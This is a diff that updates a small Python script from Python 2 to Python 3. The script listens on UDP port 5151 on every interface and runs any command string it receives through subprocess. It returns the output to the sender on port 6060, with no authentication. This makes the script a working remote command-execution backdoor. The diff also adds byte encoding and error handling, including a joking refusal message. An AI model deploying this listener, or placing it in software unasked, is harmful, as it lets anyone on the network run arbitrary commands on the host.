@@ -1,24 +1,29 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 import sys, socket, subprocess
 try:
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	sock.bind(('0.0.0.0', 5050))
+	sock.bind(('0.0.0.0', 5151))
 	while True:
 		command = sock.recvfrom(4096)
 		#print(command)
 		if not command:
 			continue
 		try:
-			print(command[0])
+			instruction = command[0].decode('utf-8')
+			print(instruction)
 			ipTuple = command[1]
 			ip = ipTuple[0]
 			#print(ip)
-			output = subprocess.check_output(command[0].split())
-			sock.sendto(str(output), (ip, 6060))
+			output = subprocess.check_output(instruction.split())
+			sock.sendto((output), (ip, 6060))
 		except OSError:
 			ipTuple = command[1]
 			ip = ipTuple[0]
-			sock.sendto(('Not a recognised command'), (ip, 6060))
+			sock.sendto(bytes('Not a recognised command', 'utf-8'), (ip, 6060))
+		except subprocess.CalledProcessError:
+			ipTuple = command[1]
+			ip = ipTuple[0]
+			sock.sendto(bytes('oWo naughty, you can\'t do that', 'utf-8'), (ip, 6060))
 
 except KeyboardInterrupt:
 	print('KeyboardInterrupt')
